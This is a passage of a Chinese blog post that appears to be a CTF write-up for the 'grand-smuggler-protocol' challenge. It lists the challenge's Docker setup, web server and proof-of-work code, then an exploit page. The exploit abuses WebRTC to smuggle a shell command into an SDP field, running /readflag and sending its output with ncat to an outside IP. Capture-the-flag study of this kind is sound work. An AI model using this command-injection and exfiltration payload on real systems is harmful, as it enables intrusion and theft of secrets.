data)</span><br><span class="line">        self.db.commit()</span><br><span class="line">        <span class="keyword">return</span> prefix, valid_until - int(time())</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_table_exists</span><span class="params">(self)</span>:</span></span><br><span class="line">        row = self.db.execute(<span class="string">'SELECT COUNT(*) FROM sqlite_master WHERE type=? AND name=?'</span>, (<span class="string">'table'</span>, <span class="string">'pow'</span>)).fetchone()</span><br><span class="line">        <span class="keyword">return</span> bool(row[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_create_table</span><span class="params">(self)</span>:</span></span><br><span class="line">        sql = <span class="string">'''</span></span><br><span class="line"><span class="string">            CREATE TABLE pow (</span></span><br><span class="line"><span class="string">                ip TEXT PRIMARY KEY,</span></span><br><span class="line"><span class="string">                valid_until INTEGER,</span></span><br><span class="line"><span class="string">                prefix TEXT</span></span><br><span class="line"><span class="string">            )</span></span><br><span class="line"><span class="string">        '''</span></span><br><span class="line">        self.db.execute(sql)</span><br><span class="line">        self.db.commit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    powser = Powser(db_path=<span class="string">'./pow.sqlite3'</span>, difficulty=<span class="number">18</span>)</span><br><span class="line">    ip = <span class="string">'240.240.240.240'</span></span><br><span class="line">    prefix, time_remain = powser.get_challenge(ip)</span><br><span class="line">    print(<span class="string">f'''</span></span><br><span class="line"><span class="string">sha256(<span class="subst">&#123;prefix&#125;</span> + ???) == <span class="subst">&#123;<span class="string">'0'</span>*powser.difficulty&#125;</span>(<span class="subst">&#123;powser.difficulty&#125;</span>)...</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">IP: <span class="subst">&#123;ip&#125;</span></span></span><br><span class="line"><span class="string">Time remain: <span class="subst">&#123;time_remain&#125;</span> seonds</span></span><br><span class="line"><span class="string">You need to await <span class="subst">&#123;time_remain - powser.min_refresh_time&#125;</span> seconds to get a new challenge.</span></span><br><span class="line"><span class="string">'''</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">is_valid</span><span class="params">(digest)</span>:</span></span><br><span class="line">        zeros = <span class="string">'0'</span> * powser.difficulty</span><br><span class="line">        bits = <span class="string">''</span>.join(bin(i)[<span class="number">2</span>:].zfill(<span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> h.digest())</span><br><span class="line">        <span class="keyword">return</span> bits[:powser.difficulty] == zeros</span><br><span class="line"></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">        s = prefix + str(i)</span><br><span class="line">        h = hashlib.sha256()</span><br><span class="line">        h.update(s.encode())</span><br><span class="line">        <span class="keyword">if</span> is_valid(h.digest()):</span><br><span class="line">            print(s)</span><br><span class="line">            print(str(i))</span><br><span class="line">            print(<span class="string">''</span>.join(bin(i)[<span class="number">2</span>:].zfill(<span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> h.digest()))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    print(powser.verify_client(ip, str(i), with_msg=<span class="literal">True</span>))</span><br></pre></td></tr></table></figure>
+
+<h6 id="详细介绍请戳这里"><a href="#详细介绍请戳这里" class="headerlink" title="详细介绍请戳这里"></a><a href="https://ljdd520.github.io/2019/12/08/2019inCTF%E7%9A%84images-and-words%E7%9A%84%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%88%B0%E8%A7%A3%E5%86%B3%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/#more" target="_blank" rel="noopener">详细介绍请戳这里</a></h6><h6 id="run-sh的内容如下："><a href="#run-sh的内容如下：" class="headerlink" title="run.sh的内容如下："></a><code>run.sh</code>的内容如下：</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/env bash</span></span><br><span class="line"></span><br><span class="line">chmod 1733 /dev/shm</span><br><span class="line"></span><br><span class="line"><span class="comment"># Start redis</span></span><br><span class="line">service redis-server restart</span><br><span class="line"></span><br><span class="line"><span class="comment"># Start redis worker</span></span><br><span class="line"><span class="built_in">export</span> LANG=C.UTF-8</span><br><span class="line"><span class="built_in">export</span> LC_ALL=C.UTF-8</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> &#123;1..4&#125;; <span class="keyword">do</span></span><br><span class="line">  sudo -H -u user rq worker --url <span class="string">'unix:///var/run/redis/redis-server.sock'</span> &amp;</span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Start eval_server</span></span><br><span class="line">sudo -H -u user ncat -klv 127.0.0.1 6666 -c <span class="string">'timeout 30 sudo -H -u eval ./eval_server'</span> &amp;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Start nginx</span></span><br><span class="line">service nginx restart</span><br><span class="line"></span><br><span class="line"><span class="comment"># Start web server</span></span><br><span class="line">sudo -H -u user gunicorn \</span><br><span class="line">  --<span class="built_in">bind</span> unix:sock/server.sock \</span><br><span class="line">  --worker-class uvicorn.workers.UvicornWorker \</span><br><span class="line">  --workers 5 \</span><br><span class="line">  --access-logfile - \</span><br><span class="line">  --error-logfile - \</span><br><span class="line">  --<span class="built_in">umask</span> 007 \</span><br><span class="line">  web_server:app</span><br></pre></td></tr></table></figure>
+
+<h6 id="下面是上面文件的详细介绍："><a href="#下面是上面文件的详细介绍：" class="headerlink" title="下面是上面文件的详细介绍："></a>下面是上面文件的详细介绍：</h6><ul>
+<li><code>3</code>行设置了<code>dev/shm</code>的权限为<code>rwsx-rx-rx</code>。</li>
+<li><code>6</code>行启动<code>redis</code>服务器。</li>
+<li><code>9</code>行设置环境变量<code>LANG=C.UTF-8</code>解决乱码。</li>
+<li><code>10</code>行设置是为了去除所有本地化的设置，让命令能正确执行。</li>
+<li><code>11~13</code>行用<code>sudo</code>提升到<code>user</code>用户去启动<code>4</code>个后台队列处理<code>redis</code>服务，基于<code>unixsocket</code>，运行在内网中。</li>
+<li><code>16</code>行在连接到<code>127.0.0.1:6666</code>时自动启动<code>eval_server</code>。</li>
+<li><code>19</code>行重启<code>nginx</code>服务器。</li>
+<li><code>22~29</code>行用这个<code>gunicorn</code>来管理<code>starlette</code>。</li>
+</ul>
+<h6 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h6><h6 id="https-outmanzzq-github-io-2018-09-11-chmod-in-linux"><a href="#https-outmanzzq-github-io-2018-09-11-chmod-in-linux" class="headerlink" title="https://outmanzzq.github.io/2018/09/11/chmod-in-linux/"></a><a href="https://outmanzzq.github.io/2018/09/11/chmod-in-linux/" target="_blank" rel="noopener">https://outmanzzq.github.io/2018/09/11/chmod-in-linux/</a></h6><h6 id="web-server-py的内容如下："><a href="#web-server-py的内容如下：" class="headerlink" title="web_server.py的内容如下："></a><code>web_server.py</code>的内容如下：</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> starlette.applications <span class="keyword">import</span> Starlette</span><br><span class="line"><span class="keyword">from</span> starlette.responses <span class="keyword">import</span> HTMLResponse</span><br><span class="line"><span class="keyword">from</span> redis <span class="keyword">import</span> Redis</span><br><span class="line"><span class="keyword">from</span> rq <span class="keyword">import</span> Queue</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> config</span><br><span class="line"><span class="keyword">from</span> powser <span class="keyword">import</span> Powser</span><br><span class="line"><span class="keyword">import</span> chrome_headless</span><br><span class="line"></span><br><span class="line">app = Starlette(debug=config.debug)</span><br><span class="line">queue = <span class="literal">None</span></span><br><span class="line">powser = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.on_event('startup')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> queue, powser</span><br><span class="line">    queue = Queue(connection=Redis(unix_socket_path=<span class="string">'/var/run/redis/redis-server.sock'</span>))</span><br><span class="line">    powser = Powser(db_path=<span class="string">'./pow/pow.sqlite3'</span>, difficulty=config.difficulty)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">(request)</span>:</span></span><br><span class="line">    ip = request.headers[<span class="string">'X-Real-IP'</span>]</span><br><span class="line">    answer = request.query_params.get(<span class="string">'answer'</span>)</span><br><span class="line">    url = request.query_params.get(<span class="string">'url'</span>)</span><br><span class="line">    <span class="keyword">if</span> answer <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> url <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> <span class="keyword">not</span> (url.startswith(<span class="string">'http://'</span>) <span class="keyword">or</span> url.startswith(<span class="string">'https://'</span>)):</span><br><span class="line">        prefix, time_remain = powser.get_challenge(ip)</span><br><span class="line">        <span class="keyword">return</span> HTMLResponse(<span class="string">f'''</span></span><br><span class="line"><span class="string"><span class="subst">&#123;prefix&#125;</span> <span class="subst">&#123;powser.difficulty&#125;</span></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">sha256(<span class="subst">&#123;prefix&#125;</span> + ???) == <span class="subst">&#123;<span class="string">'0'</span>*powser.difficulty&#125;</span>(<span class="subst">&#123;powser.difficulty&#125;</span>)...</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;form method="GET" action="/"&gt;</span></span><br><span class="line"><span class="string">  PoW answer: &lt;input type="text" name="answer"&gt;</span></span><br><span class="line"><span class="string">  URL to visit: &lt;input type="text" name="url" placeholder="https://balsn.tw/"&gt;</span></span><br><span class="line"><span class="string">  (url should start with http:// or https://)</span></span><br><span class="line"><span class="string">  &lt;input type="submit" value="Submit"&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">IP: <span class="subst">&#123;ip&#125;</span></span></span><br><span class="line"><span class="string">Time remain: <span class="subst">&#123;time_remain&#125;</span> seonds</span></span><br><span class="line"><span class="string">You need to await <span class="subst">&#123;time_remain - powser.min_refresh_time&#125;</span> seconds to get a new challenge.</span></span><br><span class="line"><span class="string">'''</span>.replace(<span class="string">'\n'</span>, <span class="string">'&lt;br&gt;\n'</span>))</span><br><span class="line">    res, msg = powser.verify_client(ip, str(answer), with_msg=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> res:</span><br><span class="line">        <span class="keyword">return</span> HTMLResponse(msg)</span><br><span class="line">    queue.enqueue(chrome_headless.browse, url)</span><br><span class="line">    <span class="keyword">return</span> HTMLResponse(<span class="string">'Okay, challenge accepted.'</span>)</span><br></pre></td></tr></table></figure>
+
+<h6 id="详细介绍请戳这里-1"><a href="#详细介绍请戳这里-1" class="headerlink" title="详细介绍请戳这里"></a><a href="https://ljdd520.github.io/2019/12/08/2019inCTF%E7%9A%84images-and-words%E7%9A%84%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%88%B0%E8%A7%A3%E5%86%B3%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/#more" target="_blank" rel="noopener">详细介绍请戳这里</a></h6><h6 id="docker-compose-yml的内容如下："><a href="#docker-compose-yml的内容如下：" class="headerlink" title="docker-compose.yml的内容如下："></a><code>docker-compose.yml</code>的内容如下：</h6><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">"2.2"</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line"><span class="attr">  grand-smuggler-protocol:</span></span><br><span class="line"><span class="attr">    build:</span> <span class="string">./</span></span><br><span class="line"><span class="attr">    ports:</span></span><br><span class="line"><span class="bullet">        -</span> <span class="string">"8080:80"</span></span><br><span class="line"><span class="attr">    hostname:</span> <span class="string">grand-smuggler-protocol</span></span><br><span class="line">    <span class="comment"># CPU/mem resources</span></span><br><span class="line"><span class="attr">    cpus:</span> <span class="number">2</span></span><br><span class="line"><span class="attr">    mem_limit:</span> <span class="number">2048</span><span class="string">M</span></span><br><span class="line"><span class="attr">    memswap_limit:</span> <span class="number">0</span><span class="string">M</span></span><br><span class="line"><span class="attr">    mem_reservation:</span> <span class="number">1024</span><span class="string">M</span></span><br><span class="line">    <span class="comment">#shm_size: 512M</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># core - limits the core file size (KB)</span></span><br><span class="line">    <span class="comment"># data - max data size (KB)</span></span><br><span class="line">    <span class="comment"># fsize - maximum filesize (bytes)</span></span><br><span class="line">    <span class="comment"># memlock - max locked-in-memory address space (KB)</span></span><br><span class="line">    <span class="comment"># nofile - max number of open file descriptors</span></span><br><span class="line">    <span class="comment"># rss - max resident set size (KB), https://stackoverflow.com/a/3361037</span></span><br><span class="line">    <span class="comment"># stack - max stack size (KB)</span></span><br><span class="line">    <span class="comment"># cpu - max CPU time (MIN)</span></span><br><span class="line">    <span class="comment"># nproc - max number of processes</span></span><br><span class="line">    <span class="comment"># as - address space limit (KB)</span></span><br><span class="line">    <span class="comment"># maxlogins - max number of logins for this user</span></span><br><span class="line">    <span class="comment"># maxsyslogins - max number of logins on the system</span></span><br><span class="line">    <span class="comment"># priority - the priority to run user process with</span></span><br><span class="line">    <span class="comment"># locks - max number of file locks the user can hold</span></span><br><span class="line">    <span class="comment"># sigpending - max number of pending signals</span></span><br><span class="line">    <span class="comment"># msgqueue - max memory used by POSIX message queues (bytes)</span></span><br><span class="line">    <span class="comment"># nice - max nice priority allowed to raise to values: [-20, 19]</span></span><br><span class="line">    <span class="comment"># rtprio - max realtime priority</span></span><br><span class="line"><span class="attr">    ulimits:</span></span><br><span class="line">    <span class="comment">#  #core: 0</span></span><br><span class="line"><span class="attr">      fsize:</span> <span class="number">1024000000</span> <span class="comment"># 1 GB</span></span><br><span class="line">    <span class="comment">#  #nofile: 32768</span></span><br><span class="line">    <span class="comment">#  #as: # <span class="doctag">NOTE:</span> this is address space. Lots of program will crash if you limit this</span></span><br><span class="line"><span class="attr">      nproc:</span> <span class="number">4096</span></span><br><span class="line"><span class="attr">      nice:</span> <span class="number">0</span></span><br></pre></td></tr></table></figure>
+
+<h6 id="详细介绍请戳这里-2"><a href="#详细介绍请戳这里-2" class="headerlink" title="详细介绍请戳这里"></a><a href="https://ljdd520.github.io/2019/12/08/2019inCTF%E7%9A%84images-and-words%E7%9A%84%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%88%B0%E8%A7%A3%E5%86%B3%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/#more" target="_blank" rel="noopener">详细介绍请戳这里</a></h6><h6 id="Dockerfile的内容如下："><a href="#Dockerfile的内容如下：" class="headerlink" title="Dockerfile的内容如下："></a><code>Dockerfile</code>的内容如下：</h6><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> ubuntu:<span class="number">18.04</span></span><br><span class="line"><span class="keyword">MAINTAINER</span> bookgin</span><br><span class="line"></span><br><span class="line"><span class="comment">#RUN sed -i 's/archive\.ubuntu/tw.archive.ubuntu/g' /etc/apt/sources.list</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> apt update -y</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> apt upgrade -y</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> apt install -y nginx</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> apt install -y sudo</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> apt install -y nmap <span class="comment"># ncat</span></span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> apt install -y chromium-browser chromium-chromedriver</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> apt install -y python3 python3-pip</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> apt install -y redis-server</span></span><br><span class="line"><span class="comment">#RUN apt install -y psmisc # killall</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> pip3 install \</span></span><br><span class="line"><span class="bash">  starlette \</span></span><br><span class="line"><span class="bash">  uvicorn \</span></span><br><span class="line"><span class="bash">  gunicorn \</span></span><br><span class="line"><span class="bash">  selenium \</span></span><br><span class="line"><span class="bash">  redis \</span></span><br><span class="line"><span class="bash">  rq</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># flag</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> useradd --no-create-home --home-dir / --shell /bin/<span class="literal">false</span> flag</span></span><br><span class="line"><span class="keyword">COPY</span><span class="bash"> flag/flag /flag</span></span><br><span class="line"><span class="keyword">COPY</span><span class="bash"> flag/readflag /readflag</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> chown flag:flag /flag</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> chown flag:flag /readflag</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> chmod 400 /flag</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> chmod 4755 /readflag</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># other secure settings</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> chmod 1733 /tmp /var/tmp <span class="comment">#/dev/shm set this in runtime</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment"># nginx</span></span><br><span class="line"><span class="keyword">COPY</span><span class="bash"> nginx/default /etc/nginx/sites-available/default</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Redis</span></span><br><span class="line"><span class="keyword">COPY</span><span class="bash"> --chown=redis:redis redis/redis.conf /etc/redis/redis.conf</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># eval server</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> useradd --no-create-home --home-dir / --shell /bin/<span class="literal">false</span> <span class="built_in">eval</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment"># general user</span></span><br><span class="line"><span class="keyword">COPY</span><span class="bash"> user /home/user</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> useradd --no-create-home --home-dir /home/user --shell /bin/<span class="literal">false</span> user</span></span><br><span class="line"><span class="comment"># so user can access redis unix socket</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> usermod --append -G redis user</span></span><br><span class="line"><span class="comment"># so www-data can read/write the unix socket</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> usermod --append -G user www-data</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> chown user:user /home/user/sock</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> chown user:user /home/user/pow</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> chmod 700 /home/user/pow</span></span><br><span class="line"><span class="comment"># Note: running python is almost the same as giving shell</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> <span class="built_in">echo</span> <span class="string">'\nuser ALL=(eval)NOPASSWD:/home/user/eval_server'</span> &gt;&gt; /etc/sudoers</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">80</span>/tcp</span><br><span class="line"></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="bash"> /home/user</span></span><br><span class="line"><span class="keyword">CMD</span><span class="bash"> bash run.sh</span></span><br></pre></td></tr></table></figure>
+
+<h6 id="下面来详细的介绍一下："><a href="#下面来详细的介绍一下：" class="headerlink" title="下面来详细的介绍一下："></a>下面来详细的介绍一下：</h6><ul>
+<li><code>1</code>行是使用的基础镜像。</li>
+<li><code>2</code>行是作者名。</li>
+<li><code>6</code>行是更新可获得的包的列表。</li>
+<li><code>7</code>行通过下载更新后列表的包。</li>
+<li><code>9~14</code>行通过<code>apt</code>下载软件包。</li>
+<li><code>16~22</code>行通过<code>pip3</code>下载软件包。</li>
+<li><code>25</code>行创建一个不带<code>/home</code>目录和配置文件的<code>flag</code>用户。</li>
+<li><code>26</code>行复制<code>flag/flag</code>的文件到<code>/flag</code>目录。</li>
+<li><code>27</code>同上。</li>
+<li><code>28</code>修改这个目录用户和用户组为<code>flag</code>。</li>
+<li><code>29</code>同上。</li>
+<li><code>30</code>修改<code>/flag</code>文件的权限为文件所有者只读。</li>
+<li><code>31</code>行chmod 4755与chmod 755的区别在于开头多了一位，这个4表示其他用户执行文件时，具有与所有者相当的权限。</li>
+<li><code>34</code>行设置<code>/tmp</code>和<code>/var/tmp</code>的权限为<code>rwx-rx-rxt</code>。</li>
+<li><code>36</code>行复制<code>nginx/default</code>文件到<code>/etc/nginx/sites-available/default</code>位置。</li>
+<li><code>40</code>行文件的复制和修改用户和用户组。</li>
+<li><code>43</code>行创建一个用户<code>eval</code>不带<code>/home</code>和配置文件。</li>
+<li><code>46</code>行将<code>user</code>目录移动到<code>/home/user</code>目录。</li>
+<li><code>47</code>行创建<code>user</code>用户同<code>43</code>行。</li>
+<li><code>49</code>行将<code>redis</code>用户添加到<code>user</code>用户组。</li>
+<li><code>51</code>行同上。</li>
+<li><code>52</code>行同<code>28</code>行。</li>
+<li><code>53</code>行同<code>28</code>行。</li>
+<li><code>54</code>行设置<code>/home/user/pow</code>目录的权限为<code>rwx------</code>。</li>
+<li><code>56</code>行设置<code>user</code>用户执行<code>/home/user/eval_server</code>时用<code>eval</code>用户的权限，并且用sudo时不用输入密码。</li>
+<li><code>58</code>暴露的端口为<code>80</code>。</li>
+<li><code>60</code>设置工作目录为<code>/home/user</code>。</li>
+<li><code>61</code>行运行<code>run.sh</code>。</li>
+</ul>
+<h6 id="参考链接-1"><a href="#参考链接-1" class="headerlink" title="参考链接"></a>参考链接</h6><h6 id="https-outmanzzq-github-io-2018-09-11-chmod-in-linux-1"><a href="#https-outmanzzq-github-io-2018-09-11-chmod-in-linux-1" class="headerlink" title="https://outmanzzq.github.io/2018/09/11/chmod-in-linux/"></a><a href="https://outmanzzq.github.io/2018/09/11/chmod-in-linux/" target="_blank" rel="noopener">https://outmanzzq.github.io/2018/09/11/chmod-in-linux/</a></h6><h6 id="exploit目录的index-html文件的内容如下："><a href="#exploit目录的index-html文件的内容如下：" class="headerlink" title="exploit目录的index.html文件的内容如下："></a><code>exploit</code>目录的<code>index.html</code>文件的内容如下：</h6><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line">// Tested on Chromium 76.0.3809.132</span><br><span class="line">// https://webrtc.github.io/samples/src/content/peerconnection/trickle-ice/</span><br><span class="line">config=&#123;"iceServers":[&#123;"urls":["stun:stun.l.google.com:19302"],"username":"","credential":""&#125;]&#125;</span><br><span class="line"></span><br><span class="line">pc1 = new RTCPeerConnection(config);</span><br><span class="line">pc2 = new RTCPeerConnection(config);</span><br><span class="line"></span><br><span class="line">pc2.addEventListener('icecandidate', (event) =&gt; &#123;</span><br><span class="line">  if (event.candidate) &#123;</span><br><span class="line">    if (event.candidate.type == 'srflx') &#123;</span><br><span class="line">        console.log("before", event.candidate);</span><br><span class="line">        let nr = new RTCIceCandidate(&#123;</span><br><span class="line">           candidate: event.candidate.candidate.replace('udp','tcp').replace(event.candidate.address,'127.0.0.1').replace(event.candidate.port, '6666'),</span><br><span class="line">           sdpMid: event.candidate.sdpMid,</span><br><span class="line">           sdpMLineIndex: event.candidate.sdpMLineIndex,</span><br><span class="line">           usernameFragment: event.candidate.usernameFragment</span><br><span class="line">         &#125;);</span><br><span class="line">        console.log("after", nr);</span><br><span class="line">        pc1.addIceCandidate(nr).catch(e =&gt; &#123;</span><br><span class="line">      console.log("Failure during addIceCandidate(): " + e.name);</span><br><span class="line">    &#125;);;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">ch1 = pc1.createDataChannel(null);</span><br><span class="line"></span><br><span class="line">pc1.createOffer().then(offer =&gt; &#123;</span><br><span class="line">  console.log("offer", offer.sdp);</span><br><span class="line">  offer.sdp = offer.sdp.replace('ice-ufrag:','ice-ufrag:\r/readflag|ncat$&#123;IFS&#125;240.240.240.240$&#123;IFS&#125;12345\r');</span><br><span class="line">  pc1.setLocalDescription(offer);</span><br><span class="line">  pc2.setRemoteDescription(offer);</span><br><span class="line">  pc2.createAnswer().then(answer =&gt; &#123;</span><br><span class="line">    //answer.sdp = answer.sdp.replace('ice-ufrag:','ice-ufrag:isanswer'); // Or you can replace this</span><br><span class="line">    pc2.setLocalDescription(answer);</span><br><span class="line">    pc1.setRemoteDescription(answer);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="tag">&lt;/<span 